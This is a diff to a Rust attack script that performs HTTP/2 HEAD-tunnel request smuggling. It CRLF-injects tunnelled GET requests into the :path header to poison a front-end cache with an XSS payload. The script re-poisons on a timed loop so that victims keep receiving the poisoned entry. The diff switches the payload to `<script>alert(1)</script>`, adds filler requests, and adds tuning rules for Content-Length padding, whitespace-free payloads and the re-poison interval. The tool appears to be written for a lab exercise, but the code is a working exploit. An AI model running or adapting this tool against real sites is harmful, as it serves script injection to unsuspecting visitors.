@@ -1,8 +1,9 @@
 #!/usr/bin/env rust-script
 //! name: h2_tunnel_head_poison
-//! description: H2 HEAD-tunnel 缓存投毒循环件 - 发一条 HTTP/2 HEAD 请求,其 :path 用 CRLF 注入若干隧道 GET(一条把载荷塞进 Location 的 /resources/<seg>?<payload> 重定向 + 一条大响应垫页);前端对 HEAD 也按 Content-Length 读体,于是把隧道响应的原始字节(含裸载荷)当作 HEAD 的响应体缓存到 HEAD 的 URL 键上;按 --interval-secs 反复重投,受害者每次来访都撞上毒化的条目。
-//! version: 1.0.0
-//! args: <url> [--payload '<img/src=x/onerror=alert(1)>'] [--filler /post?postId=1] [--seg x] [--rounds N] [--interval-secs N] [--marker S] [--read-ms N] [--selftest]
+//! description: H2 HEAD-tunnel 缓存投毒循环件 - 发一条 HTTP/2 HEAD 请求,其 :path 用 CRLF 注入若干隧道 GET(一条把载荷塞进 Location 的 /resources/<seg>?<payload> 重定向 + 两条大响应垫页);前端对 HEAD 也按 Content-Length 读体,于是把隧道响应的原始字节(含裸载荷)当作 HEAD 的响应体缓存到 HEAD 的 URL 键上;按 --interval-secs 反复重投,受害者每次来访都撞上毒化的条目。
+//!   rules: (1) 垫片总量必须 >= 外层 Content-Length(题 8641B),否则前端一直等读、我们一条回执都收不到(挂死而非报错);(2) 载荷不得依赖空白分隔属性——`<img/src=x/onerror=alert(1)>` 会被解析成单个 `src=x/onerror=alert(1)`,不产生 onerror;无空白可执行形用 `<script>alert(1)</script>` 或 `<svg/onload=alert(1)>`;(3) 缓存命中无法覆写:条目变干净后只能等 max-age 过期,故 --interval-secs 要比受害者的访问周期密得多。
+//! version: 1.0.2
+//! args: <url> [--payload '<script>alert(1)</script>'] [--filler /post?postId=1] [--seg x] [--rounds N] [--interval-secs N] [--marker S] [--read-ms N] [--selftest]
 //! keywords: h2, tunnelling, cache-poison, head, crlf, poison-loop, 武器库, 漏洞猎手套件
 //!
 //! ```cargo
@@ -38,7 +39,7 @@ async fn main() {
     let _ = rustls::crypto::ring::default_provider().install_default();
     let args: Vec<String> = std::env::args().skip(1).collect();
     let mut url = String::new();
-    let mut payload = "<img/src=x/onerror=alert(1)>".to_string();
+    let mut payload = "<script>alert(1)</script>".to_string();
     let mut filler = "/post?postId=1".to_string();
     let mut seg = "x".to_string();
     let mut rounds = 1usize;
@@ -47,9 +48,9 @@ async fn main() {
     let mut read_ms = 3000u64;
     if args.iter().any(|a| a == "--selftest") {
         let host = "example.test";
-        let p = poison_path(host, "x", "<img/src=x/onerror=alert(1)>", "/post?postId=1");
+        let p = poison_path(host, "x", "<script>alert(1)</script>", "/post?postId=1");
         let ok = p.starts_with("/ HTTP/1.1\r\n")
-            && p.contains("GET /resources/x?<img/src=x/onerror=alert(1)> HTTP/1.1")
+            && p.contains("GET /resources/x?<script>alert(1)</script> HTTP/1.1")
             && p.contains("GET /post?postId=1 HTTP/1.1")
             && !p.contains("HTTP/1.1 HTTP/1.1");
         pi_rust_lib::report::success(
@@ -76,8 +77,11 @@ async fn main() {
         i += 1;
     }
     if url.is_empty() {
-        pi_rust_lib::report::failure("h2_tunnel_head_poison", "missing url", "call as: h2_tunnel_head_poison <url> [--rounds 20] [--interval-secs 8] [--payload '<img/src=x/onerror=alert(1)>']")
-            .unwrap_or(());
+        pi_rust_lib::report::failure(
+            "h2_tunnel_head_poison",
+            "missing url",
+            "call as: h2_tunnel_head_poison <url> [--rounds 20] [--interval-secs 8] [--payload '<script>alert(1)</script>']",
+        );
         std::process::exit(2);
     }
     let parsed = Url::parse(&url).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
@@ -136,7 +140,7 @@ async fn main() {
 
 fn poison_path(host: &str, seg: &str, payload: &str, filler: &str) -> String {
     format!(
-        "/ HTTP/1.1\r\nHost: {host}\r\n\r\nGET /resources/{seg}?{payload} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {filler} HTTP/1.1\r\nHost: {host}\r\nX:"
+        "/ HTTP/1.1\r\nHost: {host}\r\n\r\nGET /resources/{seg}?{payload} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {filler} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {filler} HTTP/1.1\r\nHost: {host}\r\nX:"
     )
 }
 
